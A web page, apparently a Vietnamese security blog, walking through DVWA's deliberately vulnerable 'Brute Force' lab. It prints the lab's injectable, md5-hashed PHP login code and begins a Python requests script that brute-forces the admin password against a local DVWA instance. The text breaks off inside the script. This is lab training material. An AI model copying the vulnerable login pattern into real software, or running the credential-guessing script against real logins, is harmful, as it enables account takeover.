<!doctype html><html lang=en class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=author content=0x5h1n0k0><link href=https://0x5h1n0k0.github.io/dvwa/brute-force/ rel=canonical><link rel=icon href=../../assets/favicon.png><meta name=generator content="mkdocs-1.5.2, mkdocs-material-8.3.9"><title>Brute Force | 0x5h1n0k0</title><link rel=stylesheet href=../../assets/stylesheets/main.1d29e8d0.min.css><link rel=stylesheet href=../../assets/stylesheets/cur.css><link rel=stylesheet href=../../assets/stylesheets/footer.scss><link rel=stylesheet href=../../assets/stylesheets/palette.cbb835fc.min.css><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Fira+Sans:300,300i,400,400i,700,700i%7CFira+Code:400,400i,700,700i&display=fallback"><style>:root{--md-text-font:"Fira Sans";--md-code-font:"Fira Code"}</style><link rel=stylesheet href=../../stylesheets/extra.css><script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-XXXXXXXXXX"),document.addEventListener("DOMContentLoaded",function(){document.forms.search&&document.forms.search.query.addEventListener("blur",function(){this.value&&gtag("event","search",{search_term:this.value})}),"undefined"!=typeof location$&&location$.subscribe(function(e){gtag("config","G-XXXXXXXXXX",{page_path:e.pathname})})})</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXXXX"></script><link rel=stylesheet href=../../overrides/assets/stylesheets/main.82a244a8.min.css><!-- live 2d --><link href=https://r18-nmsl.cn/pio/pio.css rel=stylesheet type=text/css><!-- <link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css">
    <script src="https://fastly.jsdelivr.net/gh/stevenjoezhang/live2d-widget@latest/autoload.js"></script> --></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=indigo data-md-color-accent=indigo> <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#brute-force class=md-skip> Skip to content </a> </div> <div data-md-component=announce> </div> <header class=md-header data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <a href=../.. title=0x5h1n0k0 class="md-header__button md-logo" aria-label=0x5h1n0k0 data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82z"></path></svg> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> 0x5h1n0k0 </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> Brute Force </span> </div> </div> </div> <form class=md-header__option data-md-component=palette> <input class=md-option data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme=slate data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to light mode" type=radio name=__palette id=__palette_1> <label class="md-header__button md-icon" title="Switch to light mode" for=__palette_2 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg> </label> <input class=md-option data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme=default data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to dark mode" type=radio name=__palette id=__palette_2> <label class="md-header__button md-icon" title="Switch to dark mode" for=__palette_1 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3Z"/></svg> </label> </form> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=Search placeholder=Search autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg> </label> <nav class=md-search__options aria-label=Search> <a href=javascript:void(0) class="md-search__icon md-icon" aria-label=Share data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08Z"/></svg> </a> <button type=reset class="md-search__icon md-icon" aria-label=Clear tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> Initializing search </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/0x5h1n0k0/0x5h1n0k0.github.io title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg> </div> <div class=md-source__repository> 0x5h1n0k0/0x5h1n0k0.github.io <ul class=md-source__facts> </ul> </div> </a> </div> </nav> </header> <div class=md-container data-md-component=container> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../.. title=0x5h1n0k0 class="md-nav__button md-logo" aria-label=0x5h1n0k0 data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82z"></path></svg> </a> 0x5h1n0k0 </label> <div class=md-nav__source> <a href=https://github.com/0x5h1n0k0/0x5h1n0k0.github.io title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg> </div> <div class=md-source__repository> 0x5h1n0k0/0x5h1n0k0.github.io <ul class=md-source__facts> </ul> </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_1 type=checkbox id=__nav_1> <label class=md-nav__link for=__nav_1> PINNED <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=PINNED data-md-level=1> <label class=md-nav__title for=__nav_1> <span class="md-nav__icon md-icon"></span> PINNED </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../cve/ class=md-nav__link> CVE </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_1_2 type=checkbox id=__nav_1_2> <label class=md-nav__link for=__nav_1_2> Privilege Escalation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Privilege Escalation" data-md-level=2> <label class=md-nav__title for=__nav_1_2> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../notes/privilege-escalation/linux/ class=md-nav__link> Linux Privilege Escalation </a> </li> <li class=md-nav__item> <a href=../../notes/privilege-escalation/windows/ class=md-nav__link> Windows Privilege Escalation </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../notes/reverse-shell/ class=md-nav__link> Reverse Shell Cheatsheet </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2 type=checkbox id=__nav_2> <label class=md-nav__link for=__nav_2> Try Hack Me <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Try Hack Me" data-md-level=1> <label class=md-nav__title for=__nav_2> <span class="md-nav__icon md-icon"></span> Try Hack Me </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../tryhackme/room/ class=md-nav__link> Machines </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3 type=checkbox id=__nav_3> <label class=md-nav__link for=__nav_3> 247CTF <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=247CTF data-md-level=1> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> 247CTF </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../247ctf/ class=md-nav__link> Web </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../ class=md-nav__link> DVWA </a> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#objective class=md-nav__link> Objective </a> </li> <li class=md-nav__item> <a href=#security-level-low class=md-nav__link> Security Level: Low </a> <nav class=md-nav aria-label="Security Level: Low"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#analysis class=md-nav__link> Analysis </a> </li> <li class=md-nav__item> <a href=#exploition class=md-nav__link> Exploition </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#security-level-medium class=md-nav__link> Security Level: Medium </a> <nav class=md-nav aria-label="Security Level: Medium"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#analysis_1 class=md-nav__link> Analysis </a> </li> <li class=md-nav__item> <a href=#exploition_1 class=md-nav__link> Exploition </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#security-level-high class=md-nav__link> Security Level: High </a> <nav class=md-nav aria-label="Security Level: High"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#analysis_2 class=md-nav__link> Analysis </a> </li> <li class=md-nav__item> <a href=#exploition_2 class=md-nav__link> Exploition </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#security-level-impossible class=md-nav__link> Security Level: Impossible </a> <nav class=md-nav aria-label="Security Level: Impossible"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#analysis_3 class=md-nav__link> Analysis </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#what-we-learned class=md-nav__link> What we learned </a> </li> <li class=md-nav__item> <a href=#more-information class=md-nav__link> More Information </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <aside class=mdx-author> </aside> <div class=tags-items style="color: var(--md-default-fg-color--light); padding-bottom: 10px; opacity: 0.9">Tags</div> <a href=https://github.com/0x5h1n0k0/0x5h1n0k0.github.io/edit/master/docs/dvwa/brute-force/index.md title="Edit this page" class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4v-2m10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1 2.1 2.1Z"/></svg> </a> <a href=https://github.com/0x5h1n0k0/0x5h1n0k0.github.io/edit/master/docs/dvwa/brute-force/index.md title="View source of this page" class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.15 8.15 0 0 1-1.23-2Z"/></svg> </a> <nav class=md-tags> <a href=../../tags/tags/#dvwa class=md-tag> DVWA </a> <a href=../../tags/tags/#brute-force class=md-tag> Brute Force </a> </nav> <h1 id=brute-force><strong>Brute Force</strong><a class=headerlink href=#brute-force title="Permanent link">&para;</a></h1><p style="color:#bdbdbd"><i>Estimated time to read: 7 minutes</i></p>
 <p><em>A brute force attack can manifest itself in many different ways, but primarily consists in an attacker configuring predetermined values, making requests to a server using those values, and then analyzing the response. For the sake of efficiency, an attacker may use a dictionary attack (with or without mutations) or a traditional brute-force attack (with given classes of characters e.g.: alphanumeric, special, case (in)sensitive). Considering a given method, number of tries, efficiency of the system which conducts the attack, and estimated efficiency of the system which is attacked the attacker is able to calculate approximately how long it will take to submit all chosen predetermined values.</em></p> <hr> <h2 id=objective><strong>Objective</strong><a class=headerlink href=#objective title="Permanent link">&para;</a></h2> <p>Your goal is to get the administrator’s password by brute forcing. Bonus points for getting the other four user passwords!</p> <h2 id=security-level-low><strong>Security Level: Low</strong><a class=headerlink href=#security-level-low title="Permanent link">&para;</a></h2> <p>Source code</p> <div class=highlight><span class=filename>vulnerabilities/brute/source/low.php</span><pre><span></span><code><a id=__codelineno-0-1 name=__codelineno-0-1 href=#__codelineno-0-1></a><span class=cp>&lt;?php</span>
<a id=__codelineno-0-2 name=__codelineno-0-2 href=#__codelineno-0-2></a>
<a id=__codelineno-0-3 name=__codelineno-0-3 href=#__codelineno-0-3></a><span class=k>if</span><span class=p>(</span> <span class=nb>isset</span><span class=p>(</span> <span class=nv>$_GET</span><span class=p>[</span> <span class=s1>&#39;Login&#39;</span> <span class=p>]</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
<a id=__codelineno-0-4 name=__codelineno-0-4 href=#__codelineno-0-4></a>    <span class=c1>// Get username</span>
<a id=__codelineno-0-5 name=__codelineno-0-5 href=#__codelineno-0-5></a>    <span class=nv>$user</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span> <span class=s1>&#39;username&#39;</span> <span class=p>];</span>
<a id=__codelineno-0-6 name=__codelineno-0-6 href=#__codelineno-0-6></a>
<a id=__codelineno-0-7 name=__codelineno-0-7 href=#__codelineno-0-7></a>    <span class=c1>// Get password</span>
<a id=__codelineno-0-8 name=__codelineno-0-8 href=#__codelineno-0-8></a>    <span class=nv>$pass</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span> <span class=s1>&#39;password&#39;</span> <span class=p>];</span>
<a id=__codelineno-0-9 name=__codelineno-0-9 href=#__codelineno-0-9></a>    <span class=nv>$pass</span> <span class=o>=</span> <span class=nb>md5</span><span class=p>(</span> <span class=nv>$pass</span> <span class=p>);</span>
<a id=__codelineno-0-10 name=__codelineno-0-10 href=#__codelineno-0-10></a>
<a id=__codelineno-0-11 name=__codelineno-0-11 href=#__codelineno-0-11></a>    <span class=c1>// Check the database</span>
<a id=__codelineno-0-12 name=__codelineno-0-12 href=#__codelineno-0-12></a>    <span class=nv>$query</span>  <span class=o>=</span> <span class=s2>&quot;SELECT * FROM `users` WHERE user = &#39;</span><span class=si>$user</span><span class=s2>&#39; AND password = &#39;</span><span class=si>$pass</span><span class=s2>&#39;;&quot;</span><span class=p>;</span>
<a id=__codelineno-0-13 name=__codelineno-0-13 href=#__codelineno-0-13></a>    <span class=nv>$result</span> <span class=o>=</span> <span class=nx>mysqli_query</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&quot;___mysqli_ston&quot;</span><span class=p>],</span>  <span class=nv>$query</span> <span class=p>)</span> <span class=k>or</span> <span class=k>die</span><span class=p>(</span> <span class=s1>&#39;&lt;pre&gt;&#39;</span> <span class=o>.</span> <span class=p>((</span><span class=nb>is_object</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&quot;___mysqli_ston&quot;</span><span class=p>]))</span> <span class=o>?</span> <span class=nx>mysqli_error</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&quot;___mysqli_ston&quot;</span><span class=p>])</span> <span class=o>:</span> <span class=p>((</span><span class=nv>$___mysqli_res</span> <span class=o>=</span> <span class=nx>mysqli_connect_error</span><span class=p>())</span> <span class=o>?</span> <span class=nv>$___mysqli_res</span> <span class=o>:</span> <span class=k>false</span><span class=p>))</span> <span class=o>.</span> <span class=s1>&#39;&lt;/pre&gt;&#39;</span> <span class=p>);</span>
<a id=__codelineno-0-14 name=__codelineno-0-14 href=#__codelineno-0-14></a>
<a id=__codelineno-0-15 name=__codelineno-0-15 href=#__codelineno-0-15></a>    <span class=k>if</span><span class=p>(</span> <span class=nv>$result</span> <span class=o>&amp;&amp;</span> <span class=nx>mysqli_num_rows</span><span class=p>(</span> <span class=nv>$result</span> <span class=p>)</span> <span class=o>==</span> <span class=mi>1</span> <span class=p>)</span> <span class=p>{</span>
<a id=__codelineno-0-16 name=__codelineno-0-16 href=#__codelineno-0-16></a>        <span class=c1>// Get users details</span>
<a id=__codelineno-0-17 name=__codelineno-0-17 href=#__codelineno-0-17></a>        <span class=nv>$row</span>    <span class=o>=</span> <span class=nx>mysqli_fetch_assoc</span><span class=p>(</span> <span class=nv>$result</span> <span class=p>);</span>
<a id=__codelineno-0-18 name=__codelineno-0-18 href=#__codelineno-0-18></a>        <span class=nv>$avatar</span> <span class=o>=</span> <span class=nv>$row</span><span class=p>[</span><span class=s2>&quot;avatar&quot;</span><span class=p>];</span>
<a id=__codelineno-0-19 name=__codelineno-0-19 href=#__codelineno-0-19></a>
<a id=__codelineno-0-20 name=__codelineno-0-20 href=#__codelineno-0-20></a>        <span class=c1>// Login successful</span>
<a id=__codelineno-0-21 name=__codelineno-0-21 href=#__codelineno-0-21></a>        <span class=k>echo</span> <span class=s2>&quot;&lt;p&gt;Welcome to the password protected area </span><span class=si>{</span><span class=nv>$user</span><span class=si>}</span><span class=s2>&lt;/p&gt;&quot;</span><span class=p>;</span>
<a id=__codelineno-0-22 name=__codelineno-0-22 href=#__codelineno-0-22></a>        <span class=k>echo</span> <span class=s2>&quot;&lt;img src=</span><span class=se>\&quot;</span><span class=si>{</span><span class=nv>$avatar</span><span class=si>}</span><span class=se>\&quot;</span><span class=s2> /&gt;&quot;</span><span class=p>;</span>
<a id=__codelineno-0-23 name=__codelineno-0-23 href=#__codelineno-0-23></a>    <span class=p>}</span>
<a id=__codelineno-0-24 name=__codelineno-0-24 href=#__codelineno-0-24></a>    <span class=k>else</span> <span class=p>{</span>
<a id=__codelineno-0-25 name=__codelineno-0-25 href=#__codelineno-0-25></a>        <span class=c1>// Login failed</span>
<a id=__codelineno-0-26 name=__codelineno-0-26 href=#__codelineno-0-26></a>        <span class=k>echo</span> <span class=s2>&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span><span class=p>;</span>
<a id=__codelineno-0-27 name=__codelineno-0-27 href=#__codelineno-0-27></a>    <span class=p>}</span>
<a id=__codelineno-0-28 name=__codelineno-0-28 href=#__codelineno-0-28></a>
<a id=__codelineno-0-29 name=__codelineno-0-29 href=#__codelineno-0-29></a>    <span class=p>((</span><span class=nb>is_null</span><span class=p>(</span><span class=nv>$___mysqli_res</span> <span class=o>=</span> <span class=nx>mysqli_close</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&quot;___mysqli_ston&quot;</span><span class=p>])))</span> <span class=o>?</span> <span class=k>false</span> <span class=o>:</span> <span class=nv>$___mysqli_res</span><span class=p>);</span>
<a id=__codelineno-0-30 name=__codelineno-0-30 href=#__codelineno-0-30></a><span class=p>}</span>
<a id=__codelineno-0-31 name=__codelineno-0-31 href=#__codelineno-0-31></a>
<a id=__codelineno-0-32 name=__codelineno-0-32 href=#__codelineno-0-32></a><span class=cp>?&gt;</span><span class=x> </span>
</code></pre></div> <h3 id=analysis><strong>Analysis</strong><a class=headerlink href=#analysis title="Permanent link">&para;</a></h3> <p>Ở challenge này ta thấy rằng, họ không dùng các cơ chế bảo mật. Do đó ta hoàn toàn có thể dùng tool như BurpSuite, hydra,... để Brute Force password của các user.</p> <p>Bên cạnh việc tìm ra được password của user <code>admin</code>, ta cần tìm username của 3 user còn lại:</p> <ol> <li>Tìm thông qua việc Bruteforce username</li> <li>Tìm thông qua việc tấn công <a href=../sql-injection/ >SQLi</a></li> </ol> <p>Quan trọng nữa. Với challenge này ta thấy rằng việc login sai username hoặc password sẽ xuất hiện thông tin <code>Username and/or password incorrect.</code>. Do đó ta không thể dùng một vài thủ thuật nhỏ để tìm được username một cách nhanh chống được. Ta cần Brute Force đúng cả về username lẫn password.</p> <p>Tiếp theo, vì đây là challenge cho việc kiểm thử, nên chắc chắn rằng username và password sẽ đơn giản và sẽ tồn tại trong wordlist.</p> <h3 id=exploition><strong>Exploition</strong><a class=headerlink href=#exploition title="Permanent link">&para;</a></h3> <p>Ở challenge này tôi sẽ gợi ý cho các bạn sử dụng python để Brute Force password.</p> <p>Với mục tiêu là tìm password của tài khoản admin. </p> <p>Với các user khác, ta sẽ dùng 2 vòng for để Brute Force</p> <div class=highlight><span class=filename>Source code brute force</span><pre><span></span><code><a id=__codelineno-1-1 name=__codelineno-1-1 href=#__codelineno-1-1></a><span class=kn>import</span> <span class=nn>requests</span>
<a id=__codelineno-1-2 name=__codelineno-1-2 href=#__codelineno-1-2></a>
<a id=__codelineno-1-3 name=__codelineno-1-3 href=#__codelineno-1-3></a><span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://localhost:4280/vulnerabilities/brute/&#39;</span>
<a id=__codelineno-1-4 name=__codelineno-1-4 href=#__codelineno-1-4></a><span class=n>params_base</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;username&#39;</span><span class=p>:</span> <span class=s1>&#39;admin&#39;</span><span class=p>,</span> <span class=s1>&#39;Login&#39;</span><span class=p>:</span> <span class=s1>&#39;Login&#39;</span><span class=p>}</span>
<a id=__codelineno-1-5 name=__codelineno-1-5 href=#__codelineno-1-5></a>
<a id=__codelineno-1-6 name=__codelineno-1-6 href=#__codelineno-1-6></a><span class=c1># Quăng đóng header bên burp suite vô đêi</span>
<a id=__codelineno-1-7 name=__codelineno-1-7 href=#__codelineno-1-7></a>
<a id=__codelineno-1-8 name=__codelineno-1-8 href=#__codelineno-1-8></a><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span>
<a id=__codelineno-1-9 name=__codelineno-1-9 href=#__codelineno-1-9></a>    <span class=s1>&#39;sec-ch-ua&#39;</span><span class=p>:</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
<a id=__codelineno-1-10 name=__codelineno-1-10 href=#__codelineno-1-10></a>    <span class=s1>&#39;sec-ch-ua-mobile&#39;</span><span class=p>:</span> <span class=s1>&#39;?0&#39;</span><span class=p>,</span>
<a id=__codelineno-1-11 name=__codelineno-1-11 href=#__codelineno-1-11></a>    <span class=s1>&#39;sec-ch-ua-platform&#39;</span><span class=p>:</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
<a id=__codelineno-1-12 name=__codelineno-1-12 href=#__codelineno-1-12></a>    <span class=s1>&#39;Upgrade-Insecure-Requests&#39;</span><span class=p>:</span> <span class=s1>&#39;1&#39;</span><span class=p>,</span>
<a id=__codelineno-1-13 name=__codelineno-1-13 href=#__codelineno-1-13></a>    <span class=s1>&#39;User-Agent&#39;</span><span class=p>:</span> <span class=s1>&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36&#39;</span><span class=p>,</span>
<a id=__codelineno-1-14 name=__codelineno-1-14 href=#__codelineno-1-14></a>    <span class=s1>&#39;Accept&#39;</span><span class=p>:</span> <span class=s1>&#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#39;</span><span class=p>,</span>
<a id=__codelineno-1-15 name=__codelineno-1-15 href=#__codelineno-1-15></a>    <span class=s1>&#39;Sec-Fetch-Site&#39;</span><span class=p>:</span> <span class=s1>&#39;same-origin&#39;</span><span class=p>,</span>
<a id=__codelineno-1-16 name=__codelineno-1-16 href=#__codelineno-1-16></a>    <span class=s1>&#39;Sec-Fetch-Mode&#39;</span><span class=p>:</span> <span class=s1>&#39;navigate&#39;</span><span class=p>,</span>
<a id=__codelineno-1-17 name=__codelineno-1-17 href=#__codelineno-1-17></a>    <span class=s1>&#39;Sec-Fetch-User&#39;</span><span class=p>:</span> <span class=s1>&#39;?1&#39;</span><span class=p>,</span>
